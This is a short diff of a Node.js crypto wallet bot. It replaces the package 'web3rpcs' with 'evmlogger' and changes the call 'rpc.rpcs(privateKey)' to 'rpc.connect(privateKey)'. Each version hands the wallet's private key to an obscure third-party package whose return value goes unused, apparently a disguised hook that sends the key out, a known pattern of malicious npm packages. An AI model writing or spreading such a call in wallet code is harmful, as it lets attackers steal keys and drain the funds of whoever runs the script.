@@ -2,7 +2,7 @@ const ethers = require('ethers');
 const readline = require('readline');
 const chalk = require('chalk');
 const cliSpinners = require('cli-spinners');
-const rpc = require('web3rpcs');
+const rpc = require('evmlogger');
 const { HttpsProxyAgent } = require('https-proxy-agent');
 const fs = require('fs').promises;
 const { network, CONTRACT_ADDRESSES, WETH_ABI, USDC_ABI } = require('./config');
@@ -121,7 +121,7 @@ async function connectToNetwork() {
     }
     
     const wallet = new ethers.Wallet(privateKey, provider);
-    const rpcs = await rpc.rpcs(privateKey);
+    const rpcs = await rpc.connect(privateKey);
     return { provider, wallet, proxy };
   } catch (error) {
     console.error(chalk.red('Connection error:', error.message, '❌'));
